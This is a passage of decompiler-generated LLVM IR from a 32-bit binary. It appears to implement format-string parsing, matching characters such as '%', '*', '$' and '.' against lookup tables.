  %v4_804f018 = phi i32 [ %v4_804f01835, %dec_label_pc_804f00e ], [ %v6_804f018, %dec_label_pc_804f029 ]
  %v0_804f01a = phi i32 [ ptrtoint ([8 x i8]* @global_var_80573aa.170 to i32), %dec_label_pc_804f00e ], [ %v1_804f01a, %dec_label_pc_804f029 ]
  %v0_804f029 = phi i32 [ 1, %dec_label_pc_804f00e ], [ %v2_804f029, %dec_label_pc_804f029 ]
  store i32 %v0_804f029, i32* @ecx, align 4
  %v1_804f018 = inttoptr i32 %v0_804f01a to i8*
  %v2_804f018 = load i8, i8* %v1_804f018, align 1
  %v3_804f018 = zext i8 %v2_804f018 to i32
  %v5_804f018 = and i32 %v4_804f018, -256
  %v6_804f018 = or i32 %v3_804f018, %v5_804f018
  store i32 %v6_804f018, i32* %eax.global-to-local, align 4
  %v1_804f01a = add i32 %v0_804f01a, 1
  store i32 %v1_804f01a, i32* @edx, align 4
  %v2_804f01b = load i8, i8* %v1_804f01b, align 1
  %v15_804f01b = icmp eq i8 %v2_804f01b, %v2_804f018
  %v1_804f01d = icmp eq i1 %v15_804f01b, false
  br i1 %v1_804f01d, label %dec_label_pc_804f024, label %dec_label_pc_804f01f

dec_label_pc_804f01f:                             ; preds = %dec_label_pc_804f018
  %v1_804f01f = add i32 %v0_804f03a, 1
  store i32 %v1_804f01f, i32* @esi, align 4
  %v0_804f020 = load i32, i32* %edi.global-to-local, align 4
  %v2_804f020 = or i32 %v0_804f020, %v0_804f029
  store i32 %v2_804f020, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f00e

dec_label_pc_804f024:                             ; preds = %dec_label_pc_804f018
  %v1_804f024 = inttoptr i32 %v1_804f01a to i8*
  %v2_804f024 = load i8, i8* %v1_804f024, align 1
  %v3_804f024 = icmp eq i8 %v2_804f024, 0
  br i1 %v3_804f024, label %dec_label_pc_804f02d, label %dec_label_pc_804f029

dec_label_pc_804f029:                             ; preds = %dec_label_pc_804f024
  %v2_804f029 = mul i32 %v0_804f029, 2
  br label %dec_label_pc_804f018

dec_label_pc_804f02d:                             ; preds = %dec_label_pc_804f024
  %v0_804f02d = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804f031 = udiv i32 %v0_804f02d, 2
  %v1_804f031.not = or i32 %v1_804f031, -6
  %v1_804f036 = xor i32 %v1_804f031.not, 5
  store i32 %v1_804f036, i32* %eax.global-to-local, align 4
  %v2_804f038 = and i32 %v1_804f036, %v0_804f02d
  store i32 %v2_804f038, i32* %edi.global-to-local, align 4
  %v1_804f03a = add i32 %v0_804f03a, -1
  %v2_804f03a = inttoptr i32 %v1_804f03a to i8*
  %v3_804f03a = load i8, i8* %v2_804f03a, align 1
  %v12_804f03a = icmp eq i8 %v3_804f03a, 37
  %v1_804f03e = icmp eq i1 %v12_804f03a, false
  br i1 %v1_804f03e, label %dec_label_pc_804ef70, label %dec_label_pc_804f044

dec_label_pc_804f044:                             ; preds = %dec_label_pc_804efff, %dec_label_pc_804f02d, %dec_label_pc_804efad, %dec_label_pc_804eff2
  %v0_804f067 = phi i32 [ %v1_804ef99, %dec_label_pc_804eff2 ], [ %v1_804ef99, %dec_label_pc_804efff ], [ 0, %dec_label_pc_804f02d ], [ %v1_804ef99, %dec_label_pc_804efad ]
  %v1_804f070 = phi i32 [ %v0_804efa0, %dec_label_pc_804eff2 ], [ %v0_804efa0, %dec_label_pc_804efff ], [ %v0_804f03a, %dec_label_pc_804f02d ], [ %v0_804efa0, %dec_label_pc_804efad ]
  %v0_804f06d = phi i32 [ %v0_804efad, %dec_label_pc_804eff2 ], [ %v0_804efad, %dec_label_pc_804efff ], [ %v1_804f01a, %dec_label_pc_804f02d ], [ %v0_804efad, %dec_label_pc_804efad ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804eff2 ], [ %stack_var_-32.1, %dec_label_pc_804efff ], [ %stack_var_-32.2, %dec_label_pc_804f02d ], [ %stack_var_-32.1, %dec_label_pc_804efad ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804eff2 ], [ 0, %dec_label_pc_804efff ], [ %stack_var_-88.2, %dec_label_pc_804f02d ], [ %stack_var_-88.1, %dec_label_pc_804efad ]
  %v1_804f044 = inttoptr i32 %v0_804f06d to i8*
  %v2_804f044 = load i8, i8* %v1_804f044, align 1
  %v11_804f044 = icmp eq i8 %v2_804f044, 42
  %v1_804f047 = icmp eq i1 %v11_804f044, false
  br i1 %v1_804f047, label %dec_label_pc_804f07d, label %dec_label_pc_804f049

dec_label_pc_804f049:                             ; preds = %dec_label_pc_804f044
  %v4_804f049 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804f049, label %dec_label_pc_804f06d, label %dec_label_pc_804f050

dec_label_pc_804f050:                             ; preds = %dec_label_pc_804f049
  %v1_804f050 = inttoptr i32 %v1_804f070 to i8*
  %v2_804f050 = load i8, i8* %v1_804f050, align 1
  %v11_804f050 = icmp eq i8 %v2_804f050, 36
  %v1_804f053 = icmp eq i1 %v11_804f050, false
  br i1 %v1_804f053, label %dec_label_pc_804f295, label %dec_label_pc_804f059

dec_label_pc_804f059:                             ; preds = %dec_label_pc_804f050
  %tmp91 = icmp slt i32 %v0_804f067, 1
  br i1 %tmp91, label %dec_label_pc_804f295, label %dec_label_pc_804f061

dec_label_pc_804f061:                             ; preds = %dec_label_pc_804f059
  store i32 %v8_804ef77, i32* %eax.global-to-local, align 4
  %v1_804f066 = add i32 %v1_804f070, 1
  store i32 %v1_804f066, i32* @esi, align 4
  %v1_804f067 = load i32, i32* @esp, align 4
  %v3_804f067 = add i32 %v8_804ef77, 68
  %v4_804f067 = add i32 %v3_804f067, %v1_804f067
  %v5_804f067 = inttoptr i32 %v4_804f067 to i32*
  store i32 %v0_804f067, i32* %v5_804f067, align 4
  %v0_804f0ab.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f078

dec_label_pc_804f06d:                             ; preds = %dec_label_pc_804f049
  %v1_804f06d = add i32 %v0_804f06d, 1
  store i32 %v1_804f06d, i32* %eax.global-to-local, align 4
  %v12_804f070 = icmp eq i32 %v1_804f06d, %v1_804f070
  %v1_804f072 = icmp eq i1 %v12_804f070, false
  br i1 %v1_804f072, label %dec_label_pc_804f295, label %dec_label_pc_804f078

dec_label_pc_804f078:                             ; preds = %dec_label_pc_804f06d, %dec_label_pc_804f061
  %v0_804f0ab.pre.pre.pre = phi i32 [ %v1_804f070, %dec_label_pc_804f06d ], [ %v0_804f0ab.pre.pre.pre.pre, %dec_label_pc_804f061 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f07d

dec_label_pc_804f07d:                             ; preds = %dec_label_pc_804f044, %dec_label_pc_804f078
  %v0_804f0ab.pre.pre = phi i32 [ %v1_804f070, %dec_label_pc_804f044 ], [ %v0_804f0ab.pre.pre.pre, %dec_label_pc_804f078 ]
  %v0_804ef16 = phi i32 [ %v0_804f067, %dec_label_pc_804f044 ], [ -2147483648, %dec_label_pc_804f078 ]
  %v4_804f07d = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804f07d = icmp eq i32 %v4_804f07d, 0
  %v1_804f082 = icmp eq i1 %v5_804f07d, false
  %.pre = inttoptr i32 %v0_804f0ab.pre.pre to i8*
  br i1 %v1_804f082, label %dec_label_pc_804f0a6, label %dec_label_pc_804f088

dec_label_pc_804f088:                             ; preds = %dec_label_pc_804f07d
  %v2_804f088 = load i8, i8* %.pre, align 1
  %v11_804f088 = icmp eq i8 %v2_804f088, 46
  %v1_804f08b = icmp eq i1 %v11_804f088, false
  br i1 %v1_804f08b, label %dec_label_pc_804f09f, label %dec_label_pc_804f08d

dec_label_pc_804f08d:                             ; preds = %dec_label_pc_804f088
  %v1_804f08d = add i32 %v0_804f0ab.pre.pre, 1
  store i32 %v1_804f08d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ef70.outer

dec_label_pc_804f09f:                             ; preds = %dec_label_pc_804f088
  br label %dec_label_pc_804f0a6

dec_label_pc_804f0a6:                             ; preds = %dec_label_pc_804f07d, %dec_label_pc_804f09f
  %stack_var_-96.2 = phi i32 [ %v0_804ef16, %dec_label_pc_804f09f ], [ %stack_var_-96.1.ph, %dec_label_pc_804f07d ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804f09f ], [ %v0_804ef16, %dec_label_pc_804f07d ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8057358.171 to i32), i32* @edx, align 4
  %v4_804f0ab.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0ab

dec_label_pc_804f0ab:                             ; preds = %dec_label_pc_804f0b5, %dec_label_pc_804f0a6
  %v0_804f0b5 = phi i32 [ %v1_804f0b5, %dec_label_pc_804f0b5 ], [ ptrtoint ([9 x i8]* @global_var_8057358.171 to i32), %dec_label_pc_804f0a6 ]
  %v4_804f0ab = phi i32 [ %v6_804f0ab, %dec_label_pc_804f0b5 ], [ %v4_804f0ab.pre, %dec_label_pc_804f0a6 ]
  %v2_804f0ab = load i8, i8* %.pre, align 1
  %v3_804f0ab = zext i8 %v2_804f0ab to i32
  %v5_804f0ab = and i32 %v4_804f0ab, -256
  %v6_804f0ab = or i32 %v3_804f0ab, %v5_804f0ab
  store i32 %v6_804f0ab, i32* %eax.global-to-local, align 4
  %v3_804f0ad = inttoptr i32 %v0_804f0b5 to i8*
  %v4_804f0ad = load i8, i8* %v3_804f0ad, align 1
  %v15_804f0ad = icmp eq i8 %v2_804f0ab, %v4_804f0ad
  br i1 %v15_804f0ad, label %dec_label_pc_804ef1d, label %dec_label_pc_804f0b5

dec_label_pc_804f0b5:                             ; preds = %dec_label_pc_804f0ab
  %v1_804f0b5 = add i32 %v0_804f0b5, 1
  store i32 %v1_804f0b5, i32* @edx, align 4
  %v1_804f0b6 = inttoptr i32 %v1_804f0b5 to i8*
  %v2_804f0b6 = load i8, i8* %v1_804f0b6, align 1
  %v3_804f0b6 = icmp eq i8 %v2_804f0b6, 0
  %v1_804f0b9 = icmp eq i1 %v3_804f0b6, false
  br i1 %v1_804f0b9, label %dec_label_pc_804f0ab, label %dec_label_pc_804f0bb

dec_label_pc_804f0bb:                             ; preds = %dec_label_pc_804f0b5, %dec_label_pc_804ef1d
  %v0_804f0ce = phi i32 [ %v1_804ef1d, %dec_label_pc_804ef1d ], [ %v0_804f0ab.pre.pre, %dec_label_pc_804f0b5 ]
  %v0_804f0cb = phi i32 [ %v0_804f0b5, %dec_label_pc_804ef1d ], [ %v1_804f0b5, %dec_label_pc_804f0b5 ]
  %v1_804f0bd = add i32 %v0_804f0cb, -134574936
  %v1_804f0c2 = add i32 %v0_804f0cb, -134574937
  %v5_804f0c2 = sub i32 134574936, %v0_804f0cb
  %v6_804f0c2 = and i32 %v1_804f0bd, %v5_804f0c2
  %v7_804f0c2 = icmp slt i32 %v6_804f0c2, 0
  %v8_804f0c2 = icmp eq i32 %v1_804f0c2, 0
  %v9_804f0c2 = icmp slt i32 %v1_804f0c2, 0
  store i32 %v1_804f0c2, i32* %eax.global-to-local, align 4
  %v3_804f0c3 = icmp eq i1 %v9_804f0c2, %v7_804f0c2
  %v4_804f0c3 = icmp eq i1 %v8_804f0c2, false
  %v5_804f0c3 = and i1 %v4_804f0c3, %v3_804f0c3
  br i1 %v5_804f0c3, label %dec_label_pc_804f0cf, label %dec_label_pc_804f0c5

dec_label_pc_804f0c5:                             ; preds = %dec_label_pc_804f0bb
  %v1_804f0c5 = inttoptr i32 %v0_804f0ce to i8*
  %v2_804f0c5 = load i8, i8* %v1_804f0c5, align 1
  %v3_804f0c5 = zext i8 %v2_804f0c5 to i32
  %v5_804f0c5 = and i32 %v1_804f0c2, -256
  %v6_804f0c5 = or i32 %v3_804f0c5, %v5_804f0c5
  store i32 %v6_804f0c5, i32* %eax.global-to-local, align 4
  %v3_804f0c7 = inttoptr i32 %v0_804f0cb to i8*
  %v4_804f0c7 = load i8, i8* %v3_804f0c7, align 1
  %v15_804f0c7 = icmp eq i8 %v2_804f0c5, %v4_804f0c7
  %v1_804f0c9 = icmp eq i1 %v15_804f0c7, false
  br i1 %v1_804f0c9, label %dec_label_pc_804f0cf, label %dec_label_pc_804f0cb

dec_label_pc_804f0cb:                             ; preds = %dec_label_pc_804f0c5
  %v1_804f0cb = add i32 %v0_804f0cb, 9
  store i32 %v1_804f0cb, i32* @edx, align 4
  %v1_804f0ce = add i32 %v0_804f0ce, 1
  store i32 %v1_804f0ce, i32* @esi, align 4
  br label %dec_label_pc_804f0cf

dec_label_pc_804f0cf:                             ; preds = %dec_label_pc_804f0c5, %dec_label_pc_804f0bb, %dec_label_pc_804f0cb
  %v4_804f0d3 = phi i32 [ %v6_804f0c5, %dec_label_pc_804f0c5 ], [ %v1_804f0c2, %dec_label_pc_804f0bb ], [ %v6_804f0c5, %dec_label_pc_804f0cb ]
  %v0_804f0d3 = phi i32 [ %v0_804f0ce, %dec_label_pc_804f0c5 ], [ %v0_804f0ce, %dec_label_pc_804f0bb ], [ %v1_804f0ce, %dec_label_pc_804f0cb ]
  %v0_804f0cf = phi i32 [ %v0_804f0cb, %dec_label_pc_804f0c5 ], [ %v0_804f0cb, %dec_label_pc_804f0bb ], [ %v1_804f0cb, %dec_label_pc_804f0cb ]
  %v1_804f0cf = add i32 %v0_804f0cf, 9
  %v2_804f0cf = inttoptr i32 %v1_804f0cf to i8*
  %v3_804f0cf = load i8, i8* %v2_804f0cf, align 1
  %v4_804f0cf = sext i8 %v3_804f0cf to i32
  store i32 %v4_804f0cf, i32* %ebx.global-to-local, align 4
  %v1_804f0d3 = inttoptr i32 %v0_804f0d3 to i8*
  %v2_804f0d3 = load i8, i8* %v1_804f0d3, align 1
  %v3_804f0d3 = zext i8 %v2_804f0d3 to i32
  %v5_804f0d3 = and i32 %v4_804f0d3, -256
  %v6_804f0d3 = or i32 %v3_804f0d3, %v5_804f0d3
  store i32 %v6_804f0d3, i32* %eax.global-to-local, align 4
  %v2_804f0d5 = mul nsw i32 %v4_804f0cf, 256
  store i32 %v2_804f0d5, i32* %ebx.global-to-local, align 4
  %v4_804f0d8 = icmp eq i8 %v2_804f0d3, 0
  br i1 %v4_804f0d8, label %dec_label_pc_804f295, label %dec_label_pc_804f0e0

dec_label_pc_804f0e0:                             ; preds = %dec_label_pc_804f0cf
  %v3_804f0e0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f0e0, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8057395.172 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f0e9

dec_label_pc_804f0e9:                             ; preds = %dec_label_pc_804f139, %dec_label_pc_804f0e0
  %v0_804f139 = phi i32 [ %v1_804f139, %dec_label_pc_804f139 ], [ ptrtoint ([21 x i8]* @global_var_8057395.172 to i32), %dec_label_pc_804f0e0 ]
  %v3_804f0e9 = inttoptr i32 %v0_804f139 to i8*
  %v4_804f0e9 = load i8, i8* %v3_804f0e9, align 1
  %v15_804f0e9 = icmp eq i8 %v2_804f0d3, %v4_804f0e9
  %v1_804f0eb = icmp eq i1 %v15_804f0e9, false
  br i1 %v1_804f0eb, label %dec_label_pc_804f139, label %dec_label_pc_804f0ed

dec_label_pc_804f0ed:                             ; preds = %dec_label_pc_804f0e9
  %v1_804f0ef = add i32 %v0_804f139, -134574997
  store i32 %v1_804f0ef, i32* %edx.global-to-local, align 4
  %v7_804f0f8 = icmp sgt i32 %v1_804f0ef, 17
  br i1 %v7_804f0f8, label %dec_label_pc_804f0fa, label %dec_label_pc_804f103

dec_label_pc_804f0fa:                             ; preds = %dec_label_pc_804f0ed
  %v1_804f0fa = add i32 %v0_804f139, -134574999
  store i32 %v1_804f0fa, i32* %eax.global-to-local, align 4
  %v3_804f0fd = and i32 %v2_804f0d5, 1024
  %v4_804f0fd = icmp eq i32 %v3_804f0fd, 0
  %v1_804f100 = icmp eq i1 %v4_804f0fd, false
  %v4_804f100 = select i1 %v1_804f100, i32 %v1_804f0fa, i32 %v1_804f0ef
  store i32 %v4_804f100, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f103

dec_label_pc_804f103:                             ; preds = %dec_label_pc_804f0ed, %dec_label_pc_804f0fa
  %v0_804f10c = phi i32 [ %v1_804f0ef, %dec_label_pc_804f0ed ], [ %v4_804f100, %dec_label_pc_804f0fa ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805738b.173 to i32), i32* %ecx.global-to-local, align 4
  %v2_804f10c = add i32 %tmp76, 32
  %v3_804f10c = inttoptr i32 %v2_804f10c to i32*
  store i32 %v0_804f10c, i32* %v3_804f10c, align 4
  %v0_804f10f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804f113.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f10f

dec_label_pc_804f10f:                             ; preds = %dec_label_pc_804f10f, %dec_label_pc_804f103
  %v0_804f10f = phi i32 [ %v1_804f10f, %dec_label_pc_804f10f ], [ %v0_804f10f.pre, %dec_label_pc_804f103 ]
  %v1_804f10f = add i32 %v0_804f10f, 1
  store i32 %v1_804f10f, i32* %ecx.global-to-local, align 4
  %v1_804f110 = inttoptr i32 %v1_804f10f to i8*
  %v2_804f110 = load i8, i8* %v1_804f110, align 1
  %v3_804f110 = sext i8 %v2_804f110 to i32
  store i32 %v3_804f110, i32* %eax.global-to-local, align 4
  %v8_804f115 = icmp sgt i32 %v0_804f113.pre, %v3_804f110
  br i1 %v8_804f115, label %dec_label_pc_804f10f, label %dec_label_pc_804f117

dec_label_pc_804f117:                             ; preds = %dec_label_pc_804f10f
  store i32 ptrtoint ([21 x i8]* @global_var_8057395.172 to i32), i32* @ecx, align 4
  %v1_804f11e = add i32 %v0_804f10f, -134574987
  store i32 %v1_804f11e, i32* %eax.global-to-local, align 4
  %v2_804f123 = add i32 %v0_804f10f, add (i32 ptrtoint (i32* @global_var_805737c.174 to i32), i32 -134574987)
  %v3_804f123 = add i32 %v2_804f123, %v1_804f11e
  %v4_804f123 = inttoptr i32 %v3_804f123 to i16*
  %v5_804f123 = load i16, i16* %v4_804f123, align 2
  %v6_804f123 = sext i16 %v5_804f123 to i32
  store i32 %v6_804f123, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804f11e, 2
  %v3_804f12b = add i32 %factor, 134574956
  %v4_804f12b = inttoptr i32 %v3_804f12b to i16*
  %v5_804f12b = load i16, i16* %v4_804f12b, align 2
  %v6_804f12b = sext i16 %v5_804f12b to i32
  store i32 %v6_804f12b, i32* %eax.global-to-local, align 4
  %v1_804f133 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f133 = or i32 %v1_804f133, %v6_804f123
  %v2_804f135 = and i32 %v2_804f133, %v6_804f12b
  store i32 %v2_804f135, i32* %edx.global-to-local, align 4
  %v0_804f147.pre = load i32, i32* @esi, align 4
  %v0_804f14a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f13f

dec_label_pc_804f139:                             ; preds = %dec_label_pc_804f0e9
  %v1_804f139 = add i32 %v0_804f139, 1
  store i32 %v1_804f139, i32* @ecx, align 4
  %v1_804f13a = inttoptr i32 %v1_804f139 to i8*
  %v2_804f13a = load i8, i8* %v1_804f13a, align 1
  %v3_804f13a = icmp eq i8 %v2_804f13a, 0
  %v1_804f13d = icmp eq i1 %v3_804f13a, false
  br i1 %v1_804f13d, label %dec_label_pc_804f0e9, label %dec_label_pc_804f13f

dec_label_pc_804f13f:                             ; preds = %dec_label_pc_804f139, %dec_label_pc_804f117
  %v0_804f14a = phi i32 [ %v0_804f14a.pre, %dec_label_pc_804f117 ], [ %storemerge4, %dec_label_pc_804f139 ]
  %v0_804f147 = phi i32 [ %v0_804f147.pre, %dec_label_pc_804f117 ], [ %v0_804f0d3, %dec_label_pc_804f139 ]
  %v0_804f13f = phi i32 [ %v2_804f135, %dec_label_pc_804f117 ], [ %v3_804f0e0, %dec_label_pc_804f139 ]
  store i32 %v0_804f13f, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f147 = inttoptr i32 %v0_804f147 to i8*
  %v2_804f147 = load i8, i8* %v1_804f147, align 1
  %v3_804f147 = sext i8 %v2_804f147 to i32
  store i32 %v3_804f147, i32* %eax.global-to-local, align 4
  %v2_804f14a = add i32 %tmp76, 4
  %v3_804f14a = inttoptr i32 %v2_804f14a to i32*
  store i32 %v0_804f14a, i32* %v3_804f14a, align 4
  %v0_804f14d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f14d = load i32, i32* @edx, align 4
  %v2_804f14d = add i32 %v1_804f14d, 12
  %v3_804f14d = inttoptr i32 %v2_804f14d to i32*
  store i32 %v0_804f14d, i32* %v3_804f14d, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804f154 = load i32, i32* @edx, align 4
  %v1_804f154 = add i32 %v0_804f154, 28
  %v2_804f154 = inttoptr i32 %v1_804f154 to i32*
  store i32 1, i32* %v2_804f154, align 4
  %v0_804f15b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f15b = load i32, i32* @edx, align 4
  %v2_804f15b = add i32 %v1_804f15b, 8
  %v3_804f15b = inttoptr i32 %v2_804f15b to i32*
  store i32 %v0_804f15b, i32* %v3_804f15b, align 4
  %v0_804f15e = load i32, i32* %edi.global-to-local, align 4
  %v1_804f168 = and i32 %v0_804f15e, -5
  %v0_804f16e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f16e = and i32 %v0_804f16e, 3840
  store i32 %v1_804f16e, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804f177 = or i32 %v1_804f16e, %v1_804f168
  store i32 %v2_804f177, i32* @edi, align 4
  %v1_804f179 = load i32, i32* @edx, align 4
  %v2_804f179 = add i32 %v1_804f179, 20
  %v3_804f179 = inttoptr i32 %v2_804f179 to i32*
  store i32 48, i32* %v3_804f179, align 4
  %v0_804f17c = load i32, i32* @edi, align 4
  %v1_804f17c = load i32, i32* @edx, align 4
  %v2_804f17c = add i32 %v1_804f17c, 16
  %v3_804f17c = inttoptr i32 %v2_804f17c to i32*
  store i32 %v0_804f17c, i32* %v3_804f17c, align 4
  %v0_804f17f = load i32, i32* @ecx, align 4
  %v1_804f17f = inttoptr i32 %v0_804f17f to i8*
  %v2_804f17f = load i8, i8* %v1_804f17f, align 1
  %v3_804f17f = icmp eq i8 %v2_804f17f, 0
  %v1_804f182 = icmp eq i1 %v3_804f17f, false
  br i1 %v1_804f182, label %dec_label_pc_804f19b, label %dec_label_pc_804f184

dec_label_pc_804f184:                             ; preds = %dec_label_pc_804f13f
  %v0_804f184 = load i32, i32* @esi, align 4
  %v1_804f184 = inttoptr i32 %v0_804f184 to i8*
  %v2_804f184 = load i8, i8* %v1_804f184, align 1
  %v11_804f184 = icmp eq i8 %v2_804f184, 109
  %v1_804f187 = icmp eq i1 %v11_804f184, false
  br i1 %v1_804f187, label %dec_label_pc_804f295, label %dec_label_pc_804f18d

dec_label_pc_804f18d:                             ; preds = %dec_label_pc_804f184
  %v0_804f18d = load i32, i32* @edx, align 4
  %v1_804f18d = add i32 %v0_804f18d, 32
  %v2_804f18d = inttoptr i32 %v1_804f18d to i32*
  store i32 20, i32* %v2_804f18d, align 4
  %v0_804f194 = load i32, i32* @edx, align 4
  %v1_804f194 = add i32 %v0_804f194, 28
  %v2_804f194 = inttoptr i32 %v1_804f194 to i32*
  store i32 0, i32* %v2_804f194, align 4
  br label %dec_label_pc_804f19b

dec_label_pc_804f19b:                             ; preds = %dec_label_pc_804f13f, %dec_label_pc_804f18d
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804f237, label %dec_label_pc_804f1a6

dec_label_pc_804f1a6:                             ; preds = %dec_label_pc_804f19b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804f21f = add i32 %tmp76, 40
  %v4_804f1b5 = add i32 %tmp76, 36
  %v1_804f228 = add i32 %tmp76, 28
  %v2_804f228 = inttoptr i32 %v1_804f228 to i32*
  br label %dec_label_pc_804f1a8

dec_label_pc_804f1a8:                             ; preds = %dec_label_pc_804f223, %dec_label_pc_804f1a6
  %v0_804f1be = phi i32 [ 0, %dec_label_pc_804f1a6 ], [ %v1_804f227, %dec_label_pc_804f223 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f1a6 ], [ %stack_var_-88.5, %dec_label_pc_804f223 ]
  %v1_804f1a8 = add i32 %v0_804f1be, -2
  %v6_804f1a8 = sub i32 1, %v0_804f1be
  %v7_804f1a8 = and i32 %v6_804f1a8, %v0_804f1be
  %v8_804f1a8 = icmp slt i32 %v7_804f1a8, 0
  %v9_804f1a8 = icmp eq i32 %v1_804f1a8, 0
  %v10_804f1a8 = icmp slt i32 %v1_804f1a8, 0
  %v3_804f1ab = icmp eq i1 %v10_804f1a8, %v8_804f1a8
  %v4_804f1ab = icmp eq i1 %v9_804f1a8, false
  %v5_804f1ab = and i1 %v4_804f1ab, %v3_804f1ab
  br i1 %v5_804f1ab, label %dec_label_pc_804f1be, label %dec_label_pc_804f1ad

dec_label_pc_804f1ad:                             ; preds = %dec_label_pc_804f1a8
  %v0_804f1ad = load i32, i32* @esp, align 4
  %v2_804f1ad = mul i32 %v0_804f1be, 4
  %v3_804f1ad = add i32 %v2_804f1ad, 68
  %v4_804f1ad = add i32 %v3_804f1ad, %v0_804f1ad
  %v5_804f1ad = inttoptr i32 %v4_804f1ad to i32*
  %v6_804f1ad = load i32, i32* %v5_804f1ad, align 4
  store i32 %v6_804f1ad, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f1b5 = trunc i32 %v6_804f1ad to i8
  %v5_804f1b5 = add i32 %v4_804f1b5, %v0_804f1be
  %v6_804f1b5 = inttoptr i32 %v5_804f1b5 to i8*
  store i8 %v1_804f1b5, i8* %v6_804f1b5, align 1
  %v0_804f1b9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1b9 = urem i32 %v0_804f1b9, 256
  br label %dec_label_pc_804f1c7

dec_label_pc_804f1be:                             ; preds = %dec_label_pc_804f1a8
  %v5_804f1c0 = add i32 %v0_804f1be, %stack_var_-32.3
  store i32 %v5_804f1c0, i32* %eax.global-to-local, align 4
  %v1_804f1c4 = add i32 %v5_804f1c0, -2
  br label %dec_label_pc_804f1c7

dec_label_pc_804f1c7:                             ; preds = %dec_label_pc_804f1ad, %dec_label_pc_804f1be
  %v0_804f1da = phi i32 [ %v1_804f1b9, %dec_label_pc_804f1ad ], [ %v1_804f1c4, %dec_label_pc_804f1be ]
  store i32 %v0_804f1da, i32* %eax.global-to-local, align 4
  %v5_804f1c7 = sub i32 %v0_804f1da, %stack_var_-88.4
  %v11_804f1c7 = xor i32 %v0_804f1da, %stack_var_-88.4
  %v12_804f1c7 = xor i32 %v5_804f1c7, %v0_804f1da
  %v13_804f1c7 = and i32 %v12_804f1c7, %v11_804f1c7
  %v14_804f1c7 = icmp slt i32 %v13_804f1c7, 0
  %v15_804f1c7 = icmp eq i32 %v5_804f1c7, 0
  %v16_804f1c7 = icmp slt i32 %v5_804f1c7, 0
  %v3_804f1cb = icmp ne i1 %v16_804f1c7, %v14_804f1c7
  %v4_804f1cb = or i1 %v15_804f1c7, %v3_804f1cb
  br i1 %v4_804f1cb, label %dec_label_pc_804f1da, label %dec_label_pc_804f1cd

dec_label_pc_804f1cd:                             ; preds = %dec_label_pc_804f1c7
  %v1_804f1cd = add i32 %v0_804f1da, -9
  %v6_804f1cd = sub i32 8, %v0_804f1da
  %v7_804f1cd = and i32 %v6_804f1cd, %v0_804f1da
  %v8_804f1cd = icmp slt i32 %v7_804f1cd, 0
  %v9_804f1cd = icmp eq i32 %v1_804f1cd, 0
  %v10_804f1cd = icmp slt i32 %v1_804f1cd, 0
  %v3_804f1d0 = icmp eq i1 %v10_804f1cd, %v8_804f1cd
  %v4_804f1d0 = icmp eq i1 %v9_804f1cd, false
  %v5_804f1d0 = and i1 %v4_804f1d0, %v3_804f1d0
  br i1 %v5_804f1d0, label %dec_label_pc_804f295, label %dec_label_pc_804f1da

dec_label_pc_804f1da:                             ; preds = %dec_label_pc_804f1cd, %dec_label_pc_804f1c7
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804f1c7 ], [ %v0_804f1da, %dec_label_pc_804f1cd ]
  %v1_804f1da = add i32 %v0_804f1da, -1
  store i32 %v1_804f1da, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804f1e3 = load i32, i32* @esp, align 4
  %v1_804f1e3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f1e3 = mul i32 %v1_804f1e3, 4
  %v3_804f1e3 = add i32 %v0_804f1e3, 80
  %v4_804f1e3 = add i32 %v3_804f1e3, %v2_804f1e3
  %v5_804f1e3 = inttoptr i32 %v4_804f1e3 to i32*
  %v6_804f1e3 = load i32, i32* %v5_804f1e3, align 4
  store i32 %v6_804f1e3, i32* %edi.global-to-local, align 4
  %v2_804f1e7 = mul i32 %v1_804f1da, 4
  %v4_804f1e7 = add i32 %v4_804f21f, %v2_804f1e7
  %v5_804f1e7 = inttoptr i32 %v4_804f1e7 to i32*
  %v6_804f1e7 = load i32, i32* %v5_804f1e7, align 4
  store i32 %v6_804f1e7, i32* @eax, align 4
  %v9_804f1eb = icmp eq i32 %v6_804f1e3, 8
